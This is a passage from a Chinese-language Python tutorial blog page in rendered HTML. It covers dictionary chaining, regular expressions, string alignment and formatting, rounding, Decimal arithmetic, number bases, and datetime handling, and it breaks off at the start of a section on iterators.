href="#合并多个字典或映射" class="headerlink" title="合并多个字典或映射"></a>合并多个字典或映射</h4><p>假设有如下两个字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;<span class="string">'x'</span>: <span class="number">1</span>, <span class="string">'z'</span>: <span class="number">3</span> &#125;</span><br><span class="line">b = &#123;<span class="string">'y'</span>: <span class="number">2</span>, <span class="string">'z'</span>: <span class="number">4</span> &#125;</span><br></pre></td></tr></table></figure><p>假设必须在两个字典中执行查找操作（比如先从a中找，如果找不到再在b中找）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> ChainMap</span><br><span class="line">c = ChainMap(a,b)</span><br><span class="line">print(c[<span class="string">'x'</span>]) <span class="comment"># Outputs 1 (from a)</span></span><br><span class="line">print(c[<span class="string">'y'</span>]) <span class="comment"># Outputs 2 (from b)</span></span><br><span class="line">print(c[<span class="string">'z'</span>]) <span class="comment"># Outputs 3 (from a)</span></span><br></pre></td></tr></table></figure><h3 id="字符串和文本"><a href="#字符串和文本" class="headerlink" title="字符串和文本"></a>字符串和文本</h3><h4 id="使用多个界定符分割字符串"><a href="#使用多个界定符分割字符串" class="headerlink" title="使用多个界定符分割字符串"></a>使用多个界定符分割字符串</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>line = <span class="string">'asdf fjdk; afed, fjek,asdf, foo'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">r'[;,\s]\s*'</span>,line)</span><br><span class="line">[<span class="string">'asdf'</span>, <span class="string">'fjdk'</span>, <span class="string">'afed'</span>, <span class="string">'fjek'</span>, <span class="string">'asdf'</span>, <span class="string">'foo'</span>]</span><br></pre></td></tr></table></figure><p>函数<code>re.split()</code>是非常实用的，因为它允许你为分隔符指定多个正则模式。 比如，在上面的例子中，分隔符可以是逗号，分号或者是空格，并且后面紧跟着任意个的空格。 只要这个模式被找到，那么匹配的分隔符两边的实体都会被当成是结果中的元素返回。 返回结果为一个字段列表，这个跟<code>str.split()</code>返回值类型是一样的。</p><h4 id="用shell通配符匹配字符串"><a href="#用shell通配符匹配字符串" class="headerlink" title="用shell通配符匹配字符串"></a>用shell通配符匹配字符串</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> fnmatch <span class="keyword">import</span> fnmatch,fnmatchcase</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fnmatch(<span class="string">'foo.txt'</span>,<span class="string">'*.txt'</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fnmatch(<span class="string">'foo.txt'</span>,<span class="string">'*.TXT'</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fnmatchcase(<span class="string">'foo.txt'</span>,<span class="string">'*.TXT'</span>)</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="字符串匹配和搜索"><a href="#字符串匹配和搜索" class="headerlink" title="字符串匹配和搜索"></a>字符串匹配和搜索</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>datepat = re.compile(<span class="string">r'\d+/\d+/\d+'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">'today is 2023/10/7.tomorrow is 2023/10/8.'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>datepat.findall(text)</span><br><span class="line">[<span class="string">'2023/10/7'</span>, <span class="string">'2023/10/8'</span>]</span><br></pre></td></tr></table></figure><h4 id="字符串搜索和替换"><a href="#字符串搜索和替换" class="headerlink" title="字符串搜索和替换"></a>字符串搜索和替换</h4><p>对于简单的搜索，直接使用<code>str.replace()</code>方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">'this is a test.'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.replace(<span class="string">'this'</span>,<span class="string">'that'</span>)</span><br><span class="line"><span class="string">'that is a test.'</span></span><br></pre></td></tr></table></figure><p>对于复杂的模式，可以使用<code>re</code>模块中的<code>sub()</code>函数。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">'today is 2023/10/7.tomorrow is 2023/10/8.'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.sub(<span class="string">r'(\d+)/(\d+)/(\d+)'</span>, <span class="string">r'\1-\2-\3'</span>, text)</span><br><span class="line"><span class="string">'today is 2023-10-7.tomorrow is 2023-10-8.'</span></span><br></pre></td></tr></table></figure><h4 id="最短匹配模式"><a href="#最短匹配模式" class="headerlink" title="最短匹配模式"></a>最短匹配模式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str_pat = re.compile(<span class="string">r'"(.*)"'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text1 = <span class="string">'Computer says "no."'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str_pat.findall(text1)</span><br><span class="line">[<span class="string">'no.'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text2 = <span class="string">'Computer says "no." phone says "yes."'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str_pat.findall(text2)</span><br><span class="line">[<span class="string">'no." phone says "yes.'</span>]</span><br></pre></td></tr></table></figure><p>在这个例子中，模式<code>r&#39;\&quot;(.*)\&quot;&#39;</code>的意图是匹配被双引号包含的文本。 但是在正则表达式中<em>操作符是贪婪的，因此匹配操作会查找最长的可能匹配。 于是在第二个例子中搜索<code>text2</code>的时候返回结果并不是正确的。<br>为了修正这个问题，可以在模式中的</em>操作符后面加上?修饰符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str_pat = re.compile(<span class="string">r'"(.*?)"'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str_pat.findall(text2)</span><br><span class="line">[<span class="string">'no.'</span>, <span class="string">'yes.'</span>]</span><br></pre></td></tr></table></figure><h4 id="字符串对齐"><a href="#字符串对齐" class="headerlink" title="字符串对齐"></a>字符串对齐</h4><p>对于基本的字符串对齐操作，可以使用字符串的<code>ljust()</code>,<code>rjust()</code>和<code>center()</code>方法。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">'Hello World'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.ljust(<span class="number">20</span>)</span><br><span class="line"><span class="string">'Hello World         '</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.rjust(<span class="number">20</span>)</span><br><span class="line"><span class="string">'         Hello World'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.center(<span class="number">20</span>)</span><br><span class="line"><span class="string">'    Hello World     '</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>所有这些方法都能接受一个可选的填充字符。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.rjust(<span class="number">20</span>,<span class="string">'='</span>)</span><br><span class="line"><span class="string">'=========Hello World'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text.center(<span class="number">20</span>,<span class="string">'*'</span>)</span><br><span class="line"><span class="string">'****Hello World*****'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>函数<code>format()</code>同样可以用来很容易的对齐字符串。 你要做的就是使用<code>&lt;,&gt;</code>或者<code>^</code>字符后面紧跟一个指定的宽度。比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(text, <span class="string">'&gt;20'</span>)</span><br><span class="line"><span class="string">'         Hello World'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(text, <span class="string">'&lt;20'</span>)</span><br><span class="line"><span class="string">'Hello World         '</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(text, <span class="string">'^20'</span>)</span><br><span class="line"><span class="string">'    Hello World     '</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>如果你想指定一个非空格的填充字符，将它写到对齐字符的前面即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(text, <span class="string">'=&gt;20s'</span>)</span><br><span class="line"><span class="string">'=========Hello World'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(text, <span class="string">'*^20s'</span>)</span><br><span class="line"><span class="string">'****Hello World*****'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="日期和时间"><a href="#日期和时间" class="headerlink" title="日期和时间"></a>日期和时间</h3><h4 id="数字的四舍五入"><a href="#数字的四舍五入" class="headerlink" title="数字的四舍五入"></a>数字的四舍五入</h4><p>对于简单的舍入运算，使用内置的<code>round(value, ndigits)</code>函数即可。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(<span class="number">1.23</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">1.2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(<span class="number">1.27</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">1.3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(<span class="number">-1.27</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">-1.3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(<span class="number">1.25361</span>,<span class="number">3</span>)</span><br><span class="line"><span class="number">1.254</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>注意：当一个值刚好在两个边界的中间的时候，<code>round</code>函数返回离它最近的偶数。 也就是说，对1.5或者2.5的舍入运算都会得到2。</p><p>传给 round() 函数的 ndigits 参数可以是负数，这种情况下， 舍入运算会作用在十位、百位、千位等上面。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">1627731</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(a, <span class="number">-1</span>)</span><br><span class="line"><span class="number">1627730</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(a, <span class="number">-2</span>)</span><br><span class="line"><span class="number">1627700</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(a, <span class="number">-3</span>)</span><br><span class="line"><span class="number">1628000</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>不要将舍入和格式化输出搞混淆了。 如果你的目的只是简单的输出一定宽度的数，你不需要使用<code>round()</code>函数。 而仅仅只需要在格式化的时候指定精度即可。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">1.23456</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(x, <span class="string">'0.2f'</span>)</span><br><span class="line"><span class="string">'1.23'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(x, <span class="string">'0.3f'</span>)</span><br><span class="line"><span class="string">'1.235'</span></span><br></pre></td></tr></table></figure><h4 id="执行精确的浮点数运算"><a href="#执行精确的浮点数运算" class="headerlink" title="执行精确的浮点数运算"></a>执行精确的浮点数运算</h4><p>浮点数的一个普遍问题是它们并不能精确的表示十进制数。 并且，即使是最简单的数学运算也会产生小的误差，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">4.2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">2.1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a + b</span><br><span class="line"><span class="number">6.300000000000001</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(a + b) == <span class="number">6.3</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>这些错误是由底层CPU和IEEE 754标准通过自己的浮点单位去执行算术时的特征。 由于Python的浮点数据类型使用底层表示存储数据，因此你没办法去避免这样的误差。如果想更加精确可以使用<code>decimal</code>模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = Decimal(<span class="string">'4.2'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = Decimal(<span class="string">'2.1'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a + b</span><br><span class="line">Decimal(<span class="string">'6.3'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a + b)</span><br><span class="line"><span class="number">6.3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(a + b) == Decimal(<span class="string">'6.3'</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="输出进制整数"><a href="#输出进制整数" class="headerlink" title="输出进制整数"></a>输出进制整数</h4><p>为了将整数转换为二进制、八进制或十六进制的文本串， 可以分别使用<code>bin()</code>,<code>oct()</code>或<code>hex()</code>函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">1234</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bin(x)</span><br><span class="line"><span class="string">'0b10011010010'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>oct(x)</span><br><span class="line"><span class="string">'0o2322'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(x)</span><br><span class="line"><span class="string">'0x4d2'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>另外，如果你不想输出0b,0o或者0x的前缀的话，可以使用<code>format()</code>函数。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(x, <span class="string">'b'</span>)</span><br><span class="line"><span class="string">'10011010010'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(x, <span class="string">'o'</span>)</span><br><span class="line"><span class="string">'2322'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(x, <span class="string">'x'</span>)</span><br><span class="line"><span class="string">'4d2'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="无穷大和NaN"><a href="#无穷大和NaN" class="headerlink" title="无穷大和NaN"></a>无穷大和NaN</h4><p>Python并没有特殊的语法来表示这些特殊的浮点值，但是可以使用<code>float()</code>来创建它们。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = float(<span class="string">'inf'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = float(<span class="string">'-inf'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = float(<span class="string">'nan'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">inf</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">-inf</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line">nan</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>为了测试这些值的存在，使用<code>math.isinf()</code>和<code>math.isnan()</code>函数。示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.isinf(a)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.isnan(c)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="基本的日期与时间转换"><a href="#基本的日期与时间转换" class="headerlink" title="基本的日期与时间转换"></a>基本的日期与时间转换</h4><p>为了执行不同时间单位的转换和计算，可以使用<code>datetime</code>模块，为了表示一个时间段，可以创建一个<code>timedelta</code>实例，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = timedelta(days=<span class="number">2</span>, hours=<span class="number">6</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = timedelta(hours=<span class="number">4.5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = a + b</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.days</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.seconds</span><br><span class="line"><span class="number">37800</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.seconds / <span class="number">3600</span></span><br><span class="line"><span class="number">10.5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.total_seconds() / <span class="number">3600</span></span><br><span class="line"><span class="number">58.5</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>如果想表示指定的日期和时间，先创建一个<code>datetime</code>实例然后使用标准的数学运算来操作，实例如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = datetime(<span class="number">2023</span>,<span class="number">10</span>,<span class="number">9</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a+timedelta(days=<span class="number">10</span>))</span><br><span class="line"><span class="number">2023</span><span class="number">-10</span><span class="number">-19</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = datetime(<span class="number">2023</span>,<span class="number">11</span>,<span class="number">11</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = b - a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.days</span><br><span class="line"><span class="number">33</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>now = datetime.today()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(now)</span><br><span class="line"><span class="number">2023</span><span class="number">-10</span><span class="number">-09</span> <span class="number">08</span>:<span class="number">58</span>:<span class="number">22.071529</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(now+timedelta(minutes=<span class="number">10</span>))</span><br><span class="line"><span class="number">2023</span><span class="number">-10</span><span class="number">-09</span> <span class="number">09</span>:<span class="number">08</span>:<span class="number">22.071529</span></span><br></pre></td></tr></table></figure><h4 id="计算当前月份的日期范围"><a href="#计算当前月份的日期范围" class="headerlink" title="计算当前月份的日期范围"></a>计算当前月份的日期范围</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, date, timedelta</span><br><span class="line"><span class="keyword">import</span> calendar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_month_range</span><span class="params">(start_date=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> start_date <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        start_date = date.today().replace(day=<span class="number">1</span>)</span><br><span class="line">    _, days_in_month = calendar.monthrange(start_date.year, start_date.month)</span><br><span class="line">    end_date = start_date + timedelta(days=days_in_month)</span><br><span class="line">    <span class="keyword">return</span> (start_date, end_date)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a_day = timedelta(days=<span class="number">1</span>)</span><br><span class="line">first_day, last_day = get_month_range()</span><br><span class="line"><span class="keyword">while</span> first_day &lt; last_day:</span><br><span class="line">    print(first_day)</span><br><span class="line">    first_day += a_day</span><br></pre></td></tr></table></figure><p>上述代码首先计算出当月的第一天的日期，通过<code>date</code>对象的<code>replace()</code>方法将<code>days</code>属性设置为1即可。然后，使用<code>calendar.monthrange()</code>函数来找出该月的总天数。<code>monthrange()</code>函数会返回包含星期和该月天数的元组。一旦该月的天数已知了，那么结束日期就可以通过在开始日期上面加上这个天数获得。 有个需要注意的是结束日期并不包含在这个日期范围内。 这个和<code>Python</code>的<code>slice</code>与<code>range</code>操作行为保持一致，同样也不包含结尾。为了在日期范围上循环，要使用到标准的数学和比较操作。 比如，可以利用<code>timedelta</code>实例来递增日期，小于号<code>&lt;</code>用来检查一个日期是否在结束日期之前。</p><h4 id="字符串转换为日期"><a href="#字符串转换为日期" class="headerlink" title="字符串转换为日期"></a>字符串转换为日期</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>text = <span class="string">'2023-10-9'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y = datetime.strptime(text,<span class="string">"%Y-%m-%d"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y</span><br><span class="line">datetime.datetime(<span class="number">2023</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>z = datetime.now()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>z</span><br><span class="line">datetime.datetime(<span class="number">2023</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">57</span>, <span class="number">13</span>, <span class="number">378621</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>diff = z-y</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>diff</span><br><span class="line">datetime.timedelta(seconds=<span class="number">35833</span>, microseconds=<span class="number">378621</span>)</span><br></pre></td></tr></table></figure><p><code>datetime.strptime()</code>方法支持很多的格式化代码， 比如<code>%Y</code> 代表4位数年份，<code>%m</code>代表两位数月份。 还有一点值得注意的是这些格式化占位符也可以反过来使用，将日期输出为指定的格式字符串形式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">datetime.datetime(<span class="number">2023</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">57</span>, <span class="number">13</span>, <span class="number">378621</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nice_z = datetime.strftime(z,<span class="string">'%A %B %d %Y'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nice_z</span><br><span class="line"><span class="string">'Monday October 09 2023'</span></span><br></pre></td></tr></table></figure><p>有一点需要注意的是，<code>strptime()</code>的性能较差，因为它是使用纯<code>python</code>实现，并且必须处理所有的系统本地设置，因此如果在代码中需要解析大量的日期并且已知日期字符串的确切格式，可以自定义实现日期解析函数，示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_ymd</span><span class="params">(s)</span>:</span></span><br><span class="line">    year_s, mon_s, day_s = s.split(<span class="string">'-'</span>)</span><br><span class="line">    <span class="keyword">return</span> datetime(int(year_s), int(mon_s), int(day_s))</span><br></pre></td></tr></table></figure><h3 id="迭代器和生成器"><a href="#迭代器和生成器" class="headerlink" title="迭代器和生成器"></a>迭代器和生成器</h3><h4 id="手动遍历迭代器"><a href="#手动遍历迭代器" class="headerlink" title="手动遍历迭代器"></a>手动遍历迭代器</h4><p>为了手动的遍历可迭代对象，使用<code>next()</code>函数并在代码中捕获<code>StopIteration</code>异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 